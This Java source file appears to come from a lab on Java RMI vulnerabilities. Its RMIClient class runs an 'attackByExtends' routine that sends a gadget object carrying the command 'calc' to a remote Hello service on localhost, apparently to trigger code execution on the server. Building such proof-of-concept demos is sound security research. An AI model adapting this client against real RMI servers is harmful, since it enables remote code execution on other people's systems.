package org.vul;

import org.vul.dependencies.GadgetDependency;
import org.vul.inter.IHello;

import java.rmi.registry.LocateRegistry;

public class RMIClient {

    public static void attackByExtends() throws Exception {

        // 使用继承原始类方法

        IHello iHello = (IHello) LocateRegistry.getRegistry("127.0.0.1", 1099).lookup("Hello");
        GadgetDependency gadgetDependency = new GadgetDependency();
        gadgetDependency.setParam("calc");
        iHello.sayHello(gadgetDependency);
    }


    public static void main(String[] args) throws Exception {
        RMIClient.attackByExtends();
    }
}
